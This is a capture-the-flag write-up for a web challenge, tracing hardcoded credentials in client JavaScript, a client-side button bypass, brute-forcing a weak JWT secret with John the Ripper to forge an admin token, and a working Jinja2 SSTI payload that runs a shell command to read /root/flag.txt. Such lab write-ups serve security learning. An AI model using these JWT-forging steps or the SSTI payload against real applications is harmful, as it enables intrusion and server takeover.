---
title: "CTF Write-up: Orbital Boot Sequence"
date: 2025-12-16
---

**Category:** Web Exploitation
**Vulnerability:** Hardcoded Credentials, Weak JWT Secret, Server-Side Template Injection (SSTI)

## 1. Challenge Description

> **Description:** "The Orbital Boot Sequence has stalled mid-launch. Can you restart the relay and seize control before the fleet drifts off-course? Submit the `root` flag for the win."

## 2. Reconnaissance

Upon accessing the main page, I inspected the source code and noticed a reference to a JavaScript file named `/static/js/secrets.js`.

Analyzing `secrets.js` revealed hardcoded credentials in the `operatorLedger` array:

```js
const operatorLedger = [
    {
      codename: "relay-spider",
      username: "flightoperator",
      password: "GlowCloud!93",
      privilege: "operator",
    },
    // ... other revoked users
];
```

I used these credentials (`flightoperator` / `GlowCloud!93`) to successfully authenticate via the Operator Login panel.

## 3. Analyzing the Admin Panel

After logging in, I was redirected to the `/console` dashboard. I noticed a sidebar menu with an "Admin Beacon" button, but it was disabled and locked.

`<button class="menu-item locked" data-panel="admin-panel" disabled="">Admin Beacon</button>`

### Client-Side Bypass

I inspected the DOM and manually removed the `disabled` attribute and the `locked` class. This revealed the "Quantum Admin Beacon" form, which required an **Instruction template** (message) and a **Checksum signature**.

### Checksum Logic Analysis

I examined the loaded `/static/js/console.js` file and found the checksum logic used by the application:

```js
function computeChecksum(payload, token) {
    const buffer = `${payload || ""}::${token || "guest-orbital"}`;
    // ... bitwise operations ...
    return (acc >>> 0).toString(16).padStart(8, "0");
}

window.hyperpulseChecksum = computeChecksum;
```

The checksum is derived from the payload message combined with the user's session token. To automate this process during exploitation, I injected the following script into the browser console to auto-populate the checksum field whenever I typed a message:

```js
document.querySelector("#admin-message").addEventListener("input", (e) => {
    var token = hyperpulseChecksum(
	    e.target.value, 
	    sessionStorage.orbitalToken
	);
    document.querySelector("#admin-checksum").value = token;
});
```

## 4. Privilege Escalation (JWT Cracking)

When attempting to send a command via the Admin Beacon using the `flightoperator` session, the server responded with:

> _"Access denied. Admin role required."_

I checked `sessionStorage` and retrieved the `orbitalToken`. It was a JWT (JSON Web Token).

Decoded payload:

```json
{
  "sub": "flightoperator",
  "role": "operator", // Needs to be 'admin'
  "iat": 1765687354,
  "exp": 1765688554
}
```

### Cracking the Signature

To forge a new token with the `admin` role, I needed the signing secret. I saved the token to a file and used **John the Ripper** to brute-force the secret.

```bash
$ echo eyJhbGci... > token.txt
$ john token.txt
...
butterfly        (?)     
1g 0:00:00:00 DONE 2/3 ...
```

**Secret Found:** `butterfly`

### Forging the Admin Token

Using the secret `butterfly`, I created a new JWT with the payload modified to `{"role": "admin"}`. I replaced the value in the browser's `sessionStorage` with this forged token.

## 5. Exploitation (SSTI)

With the Admin token injected, I returned to the Admin Beacon form. I tested for Server-Side Template Injection (SSTI) by inputting a mathematical expression:

Payload: `{{7*7}}`
Result: `49`

The evaluation of the expression confirmed the vulnerability. The syntax suggested a Python environment (likely Jinja2).

## 6. Capturing the Flag

To retrieve the root flag mentioned in the objective, I constructed a payload to access the underlying filesystem via the `os` module.

**Payload:**

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /root/flag.txt').read() }}
```

I submitted this payload through the Admin Beacon, relying on my console script to auto-calculate the required checksum. The server executed the injection and returned the flag in the response console.

**Result:** The console output the contents of `/root/flag.txt`, securing the win.
